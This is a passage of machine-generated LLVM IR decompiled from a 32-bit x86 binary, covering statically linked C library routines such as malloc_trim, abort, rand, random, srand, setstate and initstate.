  uselistorder i32 %v1_805367d, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_8061860.494 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8061894.497 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_806188c.495, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_805b3f0.493 to i32), { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_80537dd, { 1, 0 }
  uselistorder label %dec_label_pc_80537cc, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8053788, { 1, 0 }
  uselistorder label %dec_label_pc_8053767, { 1, 0 }
  uselistorder label %dec_label_pc_8053732, { 1, 0 }
  uselistorder label %dec_label_pc_805372a, { 1, 0 }
  uselistorder label %dec_label_pc_80536f6, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80537e5 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_80537f2 = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_8061860.494 to i8) to i32) to i32*))
  %v0_80537f7 = load i32, i32* @ebx, align 4
  store i32 %v0_80537f7, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_8061860.494 to i32), i32* @edx, align 4
  store i32 %v0_80537e5, i32* @ebx, align 4
  %v0_8053802 = call i32 @__malloc_trim()
  ret i32 %v0_8053802

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_8061860.494 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_8061860.494, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8053814 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b408.514 to i32))
  %v12_805381e = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053823

dec_label_pc_8053823:                             ; preds = %dec_label_pc_8053823.dec_label_pc_8053823_crit_edge, %entry
  %v0_8053823 = phi i32 [ %v12_805381e, %entry ], [ %v0_8053823.pre, %dec_label_pc_8053823.dec_label_pc_8053823_crit_edge ]
  %v1_805382e22 = phi i32 [ 31, %entry ], [ %v1_805382e, %dec_label_pc_8053823.dec_label_pc_8053823_crit_edge ]
  %v2_8053823 = mul i32 %v1_805382e22, 4
  %v3_8053823 = add i32 %v2_8053823, 152
  %v4_8053823 = add i32 %v3_8053823, %v0_8053823
  %v5_8053823 = inttoptr i32 %v4_8053823 to i32*
  store i32 0, i32* %v5_8053823, align 4
  %v0_805382e.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_805382e = add i32 %v0_805382e.pre, -1
  %v9_805382e = icmp slt i32 %v1_805382e, 0
  store i32 %v1_805382e, i32* %eax.global-to-local, align 4
  %v1_805382f = icmp eq i1 %v9_805382e, false
  br i1 %v1_805382f, label %dec_label_pc_8053823.dec_label_pc_8053823_crit_edge, label %dec_label_pc_8053831

dec_label_pc_8053823.dec_label_pc_8053823_crit_edge: ; preds = %dec_label_pc_8053823
  %v0_8053823.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053823

dec_label_pc_8053831:                             ; preds = %dec_label_pc_8053823
  %v0_8053831 = load i32, i32* @ebx, align 4
  %v2_8053835 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8053835, i32* @ebx, align 4
  %v4_805383d = call i32 @__sigaddset(i32 %v2_8053835, i32 6, i32 %v0_8053831, i32 %v0_8053831)
  store i32 %v4_805383d, i32* %eax.global-to-local, align 4
  %v1_8053845 = icmp eq i32 %v4_805383d, 0
  %v1_8053847 = icmp eq i1 %v1_8053845, false
  br i1 %v1_8053847, label %dec_label_pc_8053857, label %dec_label_pc_8053849

dec_label_pc_8053849:                             ; preds = %dec_label_pc_8053831
  %v3_805384f = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_805384f = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_805384f, i32 0)
  store i32 %v4_805384f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053857

dec_label_pc_8053857:                             ; preds = %dec_label_pc_8053831, %dec_label_pc_8053849
  %v2_805388f4 = phi i32 [ %v4_805383d, %dec_label_pc_8053831 ], [ %v4_805384f, %dec_label_pc_8053849 ]
  %v0_8053857 = load i8, i8* @global_var_8061780.515, align 128
  %v1_8053857 = icmp eq i8 %v0_8053857, 0
  %v1_805385e = icmp eq i1 %v1_8053857, false
  br i1 %v1_805385e, label %dec_label_pc_805388f, label %dec_label_pc_8053860

dec_label_pc_8053860:                             ; preds = %dec_label_pc_8053857
  store i8 1, i8* @global_var_8061780.515, align 128
  br label %dec_label_pc_8053867

dec_label_pc_8053867:                             ; preds = %dec_label_pc_80538ce, %dec_label_pc_8053860
  %v1_805386f = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b408.514 to i32))
  store i32 %v1_805386f, i32* %eax.global-to-local, align 4
  %v1_805387b = call i32 @__raise(i32 6)
  store i32 %v1_805387b, i32* %eax.global-to-local, align 4
  %v1_8053887 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b408.514 to i32))
  store i32 %v1_8053887, i32* %eax.global-to-local, align 4
  %v0_805388f.pre = load i8, i8* @global_var_8061780.515, align 128
  br label %dec_label_pc_805388f

dec_label_pc_805388f:                             ; preds = %dec_label_pc_8053857, %dec_label_pc_8053867
  %v2_805388f = phi i32 [ %v2_805388f4, %dec_label_pc_8053857 ], [ %v1_8053887, %dec_label_pc_8053867 ]
  %v0_805388f = phi i8 [ %v0_8053857, %dec_label_pc_8053857 ], [ %v0_805388f.pre, %dec_label_pc_8053867 ]
  %v1_805388f = zext i8 %v0_805388f to i32
  %v3_805388f = and i32 %v2_805388f, -256
  %v4_805388f = or i32 %v1_805388f, %v3_805388f
  store i32 %v4_805388f, i32* %eax.global-to-local, align 4
  %v10_8053894 = icmp eq i8 %v0_805388f, 1
  %v1_8053896 = icmp eq i1 %v10_8053894, false
  br i1 %v1_8053896, label %dec_label_pc_80538f0, label %dec_label_pc_8053898

dec_label_pc_8053898:                             ; preds = %dec_label_pc_805388f
  store i8 2, i8* @global_var_8061780.515, align 128
  %v2_80538a7 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_80538a7, i32* %eax.global-to-local, align 4
  %v3_80538ac = bitcast i32* %stack_var_-272 to i8*
  %v4_80538ac = call i32 @__GI_memset(i8* %v3_80538ac, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80538c3

dec_label_pc_80538c3:                             ; preds = %dec_label_pc_80538c3.dec_label_pc_80538c3_crit_edge, %dec_label_pc_8053898
  %v0_80538c3 = phi i32 [ %v12_805381e, %dec_label_pc_8053898 ], [ %v0_80538c3.pre, %dec_label_pc_80538c3.dec_label_pc_80538c3_crit_edge ]
  %v1_80538cb21 = phi i32 [ 31, %dec_label_pc_8053898 ], [ %v1_80538cb, %dec_label_pc_80538c3.dec_label_pc_80538c3_crit_edge ]
  %v2_80538c3 = mul i32 %v1_80538cb21, 4
  %v3_80538c3 = add i32 %v2_80538c3, 16
  %v4_80538c3 = add i32 %v3_80538c3, %v0_80538c3
  %v5_80538c3 = inttoptr i32 %v4_80538c3 to i32*
  store i32 -1, i32* %v5_80538c3, align 4
  %v0_80538cb.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80538cb = add i32 %v0_80538cb.pre, -1
  %v9_80538cb = icmp slt i32 %v1_80538cb, 0
  store i32 %v1_80538cb, i32* %eax.global-to-local, align 4
  %v1_80538cc = icmp eq i1 %v9_80538cb, false
  br i1 %v1_80538cc, label %dec_label_pc_80538c3.dec_label_pc_80538c3_crit_edge, label %dec_label_pc_80538ce

dec_label_pc_80538c3.dec_label_pc_80538c3_crit_edge: ; preds = %dec_label_pc_80538c3
  %v0_80538c3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80538c3

dec_label_pc_80538ce:                             ; preds = %dec_label_pc_80538c3
  store i32 %v2_80538a7, i32* %eax.global-to-local, align 4
  %v4_80538e3 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_80538e3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053867

dec_label_pc_80538f0:                             ; preds = %dec_label_pc_805388f
  %v10_80538f0 = icmp eq i8 %v0_805388f, 2
  %v1_80538f2 = icmp eq i1 %v10_80538f0, false
  br i1 %v1_80538f2, label %dec_label_pc_80538fc, label %dec_label_pc_80538fc.thread

dec_label_pc_80538fc.thread:                      ; preds = %dec_label_pc_80538f0
  store i8 3, i8* @global_var_8061780.515, align 128
  br label %dec_label_pc_8053905

dec_label_pc_80538fc:                             ; preds = %dec_label_pc_80538f0
  %v9_80538fc = icmp eq i8 %v0_805388f, 3
  %v1_8053903 = icmp eq i1 %v9_80538fc, false
  br i1 %v1_8053903, label %dec_label_pc_8053916, label %dec_label_pc_8053905

dec_label_pc_8053905:                             ; preds = %dec_label_pc_80538fc.thread, %dec_label_pc_80538fc
  store i8 4, i8* @global_var_8061780.515, align 128
  %v1_8053911 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8053916:                             ; preds = %dec_label_pc_80538fc, %dec_label_pc_8053916
  br label %dec_label_pc_8053916

; uselistorder directives
  uselistorder i32 %v1_80538cb, { 2, 1, 0 }
  uselistorder i32 %v1_805382e, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10, 13, 14 }
  uselistorder i8 3, { 0, 3, 2, 1 }
  uselistorder i8* @global_var_8061780.515, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8053916, { 1, 0 }
  uselistorder label %dec_label_pc_8053905, { 1, 0 }
  uselistorder label %dec_label_pc_805388f, { 1, 0 }
  uselistorder label %dec_label_pc_8053857, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_805391c = call i32 @random()
  ret i32 %v0_805391c

; uselistorder directives
  uselistorder i32 ()* @random, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053924 = load i32, i32* @ebx, align 4
  store i32 %v0_8053924, i32* %stack_var_-4, align 4
  %v2_8053932 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053932, i32* @ebx, align 4
  %v2_8053937 = call i32 @__pthread_return_void(i32 %v2_8053932, i32 134562611)
  %v1_8053943 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b420.516 to i32))
  %v2_805394a = ptrtoint i32* %stack_var_-8 to i32
  %v3_8053954 = call i32 @__GI_random_r(i32* nonnull @global_var_805b438, i32 %v2_805394a)
  store i32 ptrtoint (i32* @global_var_805b438 to i32), i32* @eax, align 4
  %v2_805395e = call i32 @__pthread_return_void(i32 %v2_8053932, i32 1)
  %v3_8053963 = load i32, i32* %stack_var_-8, align 4
  %v2_805396a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805396a, i32* @ebx, align 4
  ret i32 %v3_8053963
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_805397d = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805397d, i32* @eax, align 4
  %v2_8053982 = call i32 @__pthread_return_void(i32 %v2_805397d, i32 134562611)
  %v1_805398e = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b420.516 to i32))
  %v0_805399a = load i32, i32* bitcast (i32** @global_var_805b440.519 to i32*), align 64
  store i32 %v0_805399a, i32* @ebx, align 4
  %v3_80539a4 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_805b438)
  %v2_80539ac = icmp slt i32 %v3_80539a4, 0
  br i1 %v2_80539ac, label %dec_label_pc_80539b3, label %dec_label_pc_80539b0

dec_label_pc_80539b0:                             ; preds = %entry
  store i32 ptrtoint (i32** @global_var_805b43c.520 to i32), i32* @esi, align 4
  br label %dec_label_pc_80539b3

dec_label_pc_80539b3:                             ; preds = %entry, %dec_label_pc_80539b0
  store i32 %v2_805397d, i32* @eax, align 4
  %v2_80539bc = call i32 @__pthread_return_void(i32 %v2_805397d, i32 1)
  %v0_80539c1 = load i32, i32* @esi, align 4
  ret i32 %v0_80539c1

; uselistorder directives
  uselistorder label %dec_label_pc_80539b3, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_80539d8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80539d8, i32* @ebx, align 4
  %v2_80539dd = call i32 @__pthread_return_void(i32 %v2_80539d8, i32 134562611)
  %v1_80539e9 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b420.516 to i32))
  %v0_80539f3 = load i32, i32* bitcast (i32** @global_var_805b440.519 to i32*), align 64
  store i32 %v0_80539f3, i32* @esi, align 4
  %v4_8053a05 = inttoptr i32 %arg2 to i32*
  %v5_8053a05 = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_8053a05, i32 %arg3, i32 ptrtoint (i32* @global_var_805b438 to i32))
  store i32 %v5_8053a05, i32* @eax, align 4
  %v2_8053a10 = call i32 @__pthread_return_void(i32 %v2_80539d8, i32 1)
  ret i32 ptrtoint (i32** @global_var_805b43c.520 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8053a20 = load i32, i32* @ebx, align 4
  store i32 %v0_8053a20, i32* %stack_var_-4, align 4
  %v2_8053a2e = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8053a2e, i32* @ebx, align 4
  %v2_8053a33 = call i32 @__pthread_return_void(i32 %v2_8053a2e, i32 134562611)
  %v1_8053a3f = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b420.516 to i32))
  %v2_8053a4f = sext i32 %arg1 to i64
  %v3_8053a4f = call i32 @srandom_r(i64 %v2_8053a4f, i32 ptrtoint (i32* @global_var_805b438 to i32))
  store i32 ptrtoint (i32* @global_var_805b438 to i32), i32* @eax, align 4
  %v2_8053a59 = call i32 @__pthread_return_void(i32 %v2_8053a2e, i32 1)
  %v2_8053a61 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053a61, i32* @ebx, align 4
  ret i32 %v2_8053a59

; uselistorder directives
  uselistorder i32* @global_var_805b438, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_805b438 to i32), { 1, 3, 2, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg2 to i32
  %v0_8053a67 = load i32, i32* @ebx, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v1_8053a73 = add i32 %arg1, 4
  store i32 %v1_8053a73, i32* %esi.global-to-local, align 4
  %v1_8053a76 = add i32 %tmp4, 12
  %v2_8053a76 = inttoptr i32 %v1_8053a76 to i32*
  %v3_8053a76 = load i32, i32* %v2_8053a76, align 4
  store i32 %v3_8053a76, i32* %ecx.global-to-local, align 4
  %v1_8053a79 = add i32 %tmp4, 8
  %v2_8053a79 = inttoptr i32 %v1_8053a79 to i32*
  %v3_8053a79 = load i32, i32* %v2_8053a79, align 4
  %v1_8053a7c = icmp eq i32 %v3_8053a76, 0
  %v1_8053a7e = icmp eq i1 %v1_8053a7c, false
  br i1 %v1_8053a7e, label %dec_label_pc_8053a89, label %dec_label_pc_8053a80

dec_label_pc_8053a80:                             ; preds = %entry
  %v1_8053a80 = add i32 %v3_8053a79, -4
  %v2_8053a80 = inttoptr i32 %v1_8053a80 to i32*
  store i32 0, i32* %v2_8053a80, align 4
  br label %dec_label_pc_8053a99

dec_label_pc_8053a89:                             ; preds = %entry
  %v1_8053a89 = add i32 %tmp4, 4
  %v2_8053a89 = inttoptr i32 %v1_8053a89 to i32*
  %v3_8053a89 = load i32, i32* %v2_8053a89, align 4
  %v2_8053a8c = sub i32 %v3_8053a89, %v3_8053a79
  %v2_8053a8e = sdiv i32 %v2_8053a8c, 4
  %v3_8053a91 = mul i32 %v2_8053a8e, 5
  %v2_8053a94 = add i32 %v3_8053a91, %v3_8053a76
  store i32 %v2_8053a94, i32* %eax.global-to-local, align 4
  %v2_8053a96 = add i32 %v3_8053a79, -4
  %v3_8053a96 = inttoptr i32 %v2_8053a96 to i32*
  store i32 %v2_8053a94, i32* %v3_8053a96, align 4
  br label %dec_label_pc_8053a99

dec_label_pc_8053a99:                             ; preds = %dec_label_pc_8053a80, %dec_label_pc_8053a89
  %v0_8053a99 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053a99 = add i32 %v0_8053a99, -4
  %v2_8053a99 = inttoptr i32 %v1_8053a99 to i32*
  %v3_8053a99 = load i32, i32* %v2_8053a99, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_8053aa1 = ashr i32 %v3_8053a99, 31
  %v2_8053aa2 = zext i32 %v3_8053a99 to i64
  %v4_8053aa2 = zext i32 %v1_8053aa1 to i64
  %v5_8053aa2 = mul nuw i64 %v4_8053aa2, 4294967296
  %v6_8053aa2 = or i64 %v5_8053aa2, %v2_8053aa2
  %v8_8053aa2 = sdiv i64 %v6_8053aa2, 5
  %v9_8053aa2 = trunc i64 %v8_8053aa2 to i32
  store i32 %v9_8053aa2, i32* %eax.global-to-local, align 4
  %v10_8053aa2 = srem i64 %v6_8053aa2, 5
  %v11_8053aa2 = trunc i64 %v10_8053aa2 to i32
  %v6_8053aa7 = icmp ugt i32 %v11_8053aa2, 4
  br i1 %v6_8053aa7, label %dec_label_pc_8053ae7, label %dec_label_pc_8053aa9

dec_label_pc_8053aa9:                             ; preds = %dec_label_pc_8053a99
  %v1_8053aa9 = mul i32 %v11_8053aa2, 4
  %v2_8053aa9 = add i32 %v1_8053aa9, ptrtoint (i32* @global_var_8059f34.521 to i32)
  %v3_8053aa9 = inttoptr i32 %v2_8053aa9 to i32*
  %v4_8053aa9 = load i32, i32* %v3_8053aa9, align 4
  store i32 %v4_8053aa9, i32* %ecx.global-to-local, align 4
  %v2_8053ab0 = add i32 %v1_8053aa9, ptrtoint (i32* @global_var_8059f20.522 to i32)
  %v3_8053ab0 = inttoptr i32 %v2_8053ab0 to i32*
  %v4_8053ab0 = load i32, i32* %v3_8053ab0, align 4
  store i32 %v4_8053ab0, i32* %ebp.global-to-local, align 4
  %v1_8053ab7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053ab7 = add i32 %v1_8053ab7, 16
  %v3_8053ab7 = inttoptr i32 %v2_8053ab7 to i32*
  store i32 %v4_8053aa9, i32* %v3_8053ab7, align 4
  %v0_8053aba = load i32, i32* %ebp.global-to-local, align 4
  %v1_8053aba = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053aba = add i32 %v1_8053aba, 20
  %v3_8053aba = inttoptr i32 %v2_8053aba to i32*
  store i32 %v0_8053aba, i32* %v3_8053aba, align 4
  %v1_8053abd = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053abd = add i32 %v1_8053abd, 12
  %v3_8053abd = inttoptr i32 %v2_8053abd to i32*
  store i32 %v11_8053aa2, i32* %v3_8053abd, align 4
  %v1_8053ac0 = icmp eq i32 %v11_8053aa2, 0
  br i1 %v1_8053ac0, label %dec_label_pc_8053ada, label %dec_label_pc_8053ac4

dec_label_pc_8053ac4:                             ; preds = %dec_label_pc_8053aa9
  %v0_8053ac4 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053ac4 = add i32 %v0_8053ac4, -4
  %v2_8053ac4 = inttoptr i32 %v1_8053ac4 to i32*
  %v3_8053ac4 = load i32, i32* %v2_8053ac4, align 4
  %v1_8053ac7 = ashr i32 %v3_8053ac4, 31
  %v0_8053ac8 = load i32, i32* %edi.global-to-local, align 4
  %v2_8053ac8 = zext i32 %v3_8053ac4 to i64
  %v4_8053ac8 = zext i32 %v1_8053ac7 to i64
  %v5_8053ac8 = mul nuw i64 %v4_8053ac8, 4294967296
  %v6_8053ac8 = or i64 %v5_8053ac8, %v2_8053ac8
  %v7_8053ac8 = zext i32 %v0_8053ac8 to i64
  %v8_8053ac8 = sdiv i64 %v6_8053ac8, %v7_8053ac8
  %v9_8053ac8 = trunc i64 %v8_8053ac8 to i32
  %v2_8053aca = mul i32 %v9_8053ac8, 4
  %v3_8053aca = add i32 %v2_8053aca, %v0_8053ac4
  %v1_8053acd = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053acd = add i32 %v1_8053acd, %v9_8053ac8
  store i32 %v2_8053acd, i32* %eax.global-to-local, align 4
  %v1_8053acf = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053acf = add i32 %v1_8053acf, 4
  %v3_8053acf = inttoptr i32 %v2_8053acf to i32*
  store i32 %v3_8053aca, i32* %v3_8053acf, align 4
  %v0_8053ad2 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053ad2 = ashr i32 %v0_8053ad2, 31
  %v0_8053ad3 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8053ad3 = zext i32 %v0_8053ad2 to i64
  %v4_8053ad3 = zext i32 %v1_8053ad2 to i64
  %v5_8053ad3 = mul nuw i64 %v4_8053ad3, 4294967296
  %v6_8053ad3 = or i64 %v5_8053ad3, %v2_8053ad3
  %v7_8053ad3 = zext i32 %v0_8053ad3 to i64
  %v8_8053ad3 = sdiv i64 %v6_8053ad3, %v7_8053ad3
  %v9_8053ad3 = trunc i64 %v8_8053ad3 to i32
  store i32 %v9_8053ad3, i32* %eax.global-to-local, align 4
  %v10_8053ad3 = srem i64 %v6_8053ad3, %v7_8053ad3
  %v11_8053ad3 = trunc i64 %v10_8053ad3 to i32
  %v0_8053ad5 = load i32, i32* %esi.global-to-local, align 4
  %v2_8053ad5 = mul i32 %v11_8053ad3, 4
  %v3_8053ad5 = add i32 %v2_8053ad5, %v0_8053ad5
  %v1_8053ad8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053ad8 = inttoptr i32 %v1_8053ad8 to i32*
  store i32 %v3_8053ad5, i32* %v2_8053ad8, align 4
  br label %dec_label_pc_8053ada

dec_label_pc_8053ada:                             ; preds = %dec_label_pc_8053aa9, %dec_label_pc_8053ac4
  %v0_8053ada = load i32, i32* %esi.global-to-local, align 4
  %v1_8053ada = load i32, i32* %ecx.global-to-local, align 4
  %v2_8053ada = mul i32 %v1_8053ada, 4
  %v3_8053ada = add i32 %v2_8053ada, %v0_8053ada
  store i32 %v3_8053ada, i32* %eax.global-to-local, align 4
  %v1_8053add = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053add = add i32 %v1_8053add, 8
  %v3_8053add = inttoptr i32 %v2_8053add to i32*
  store i32 %v0_8053ada, i32* %v3_8053add, align 4
  %v0_8053ae0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053ae0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053ae0 = add i32 %v1_8053ae0, 24
  %v3_8053ae0 = inttoptr i32 %v2_8053ae0 to i32*
  store i32 %v0_8053ae0, i32* %v3_8053ae0, align 4
  br label %dec_label_pc_8053af5

dec_label_pc_8053ae7:                             ; preds = %dec_label_pc_8053a99
  %v1_8053ae7 = call i32 @__errno_location(i32 %v0_8053a67)
  store i32 %v1_8053ae7, i32* %eax.global-to-local, align 4
  %v1_8053aec = inttoptr i32 %v1_8053ae7 to i32*
  store i32 22, i32* %v1_8053aec, align 4
  br label %dec_label_pc_8053af5

dec_label_pc_8053af5:                             ; preds = %dec_label_pc_8053ada, %dec_label_pc_8053ae7
  %storemerge = phi i32 [ -1, %dec_label_pc_8053ae7 ], [ 0, %dec_label_pc_8053ada ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8053a67, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_8053ada, { 1, 0 }
  uselistorder i32 %v11_8053aa2, { 2, 1, 3, 0 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i64 5, { 1, 0 }
  uselistorder label %dec_label_pc_8053af5, { 1, 0 }
  uselistorder label %dec_label_pc_8053ada, { 1, 0 }
  uselistorder label %dec_label_pc_8053a99, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8053b00 = load i32, i32* @ebx, align 4
  store i32 %v0_8053b00, i32* %stack_var_-16, align 4
  store i32 %tmp2, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_8053b09 = add i32 %tmp2, 8
  %v2_8053b09 = inttoptr i32 %v1_8053b09 to i32*
  %v3_8053b09 = load i32, i32* %v2_8053b09, align 4
  store i32 %v3_8053b09, i32* %esi.global-to-local, align 4
  %v1_8053b0c = add i32 %tmp2, 12
  %v2_8053b0c = inttoptr i32 %v1_8053b0c to i32*
  %v3_8053b0c = load i32, i32* %v2_8053b0c, align 4
  %v4_8053b0c = icmp eq i32 %v3_8053b0c, 0
  %v1_8053b10 = icmp eq i1 %v4_8053b0c, false
  br i1 %v1_8053b10, label %dec_label_pc_8053b29, label %dec_label_pc_8053b12

dec_label_pc_8053b12:                             ; preds = %entry
  %v2_8053b12 = inttoptr i32 %v3_8053b09 to i32*
  %v3_8053b12 = load i32, i32* %v2_8053b12, align 4
  %v5_8053b12 = mul i32 %v3_8053b12, 1103515245
  %v1_8053b18 = add i32 %v5_8053b12, 12345
  %v1_8053b1d = urem i32 %v1_8053b18, -2147483648
  store i32 %v1_8053b1d, i32* %eax.global-to-local, align 4
  store i32 %v1_8053b1d, i32* %v2_8053b12, align 4
  %v0_8053b24 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053b24 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053b24 = inttoptr i32 %v1_8053b24 to i32*
  store i32 %v0_8053b24, i32* %v2_8053b24, align 4
  br label %dec_label_pc_8053b55

dec_label_pc_8053b29:                             ; preds = %entry
  %v1_8053b29 = add i32 %tmp2, 4
  %v2_8053b29 = inttoptr i32 %v1_8053b29 to i32*
  %v3_8053b29 = load i32, i32* %v2_8053b29, align 4
  store i32 %v3_8053b29, i32* %ecx.global-to-local, align 4
  %v2_8053b2c = load i32, i32* %arg1, align 4
  store i32 %v2_8053b2c, i32* %edx.global-to-local, align 4
  %v1_8053b2e = add i32 %tmp2, 24
  %v2_8053b2e = inttoptr i32 %v1_8053b2e to i32*
  %v3_8053b2e = load i32, i32* %v2_8053b2e, align 4
  store i32 %v3_8053b2e, i32* %edi.global-to-local, align 4
  %v1_8053b31 = inttoptr i32 %v3_8053b29 to i32*
  %v2_8053b31 = load i32, i32* %v1_8053b31, align 4
  store i32 %v2_8053b31, i32* %eax.global-to-local, align 4
  %v1_8053b33 = inttoptr i32 %v2_8053b2c to i32*
  %v2_8053b33 = load i32, i32* %v1_8053b33, align 4
  %v4_8053b33 = add i32 %v2_8053b33, %v2_8053b31
  store i32 %v4_8053b33, i32* %v1_8053b33, align 4
  %v0_8053b35 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053b35 = inttoptr i32 %v0_8053b35 to i32*
  %v2_8053b35 = load i32, i32* %v1_8053b35, align 4
  %v1_8053b37 = add i32 %v0_8053b35, 4
  store i32 %v1_8053b37, i32* %edx.global-to-local, align 4
  %v2_8053b3a = udiv i32 %v2_8053b35, 2
  %v1_8053b3c = load i32, i32* %edi.global-to-local, align 4
  %v7_8053b3c = icmp ult i32 %v1_8053b37, %v1_8053b3c
  %v1_8053b3e = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053b3e = inttoptr i32 %v1_8053b3e to i32*
  store i32 %v2_8053b3a, i32* %v2_8053b3e, align 4
  %v0_8053b41 = load i32, i32* %ecx.global-to-local, align 4
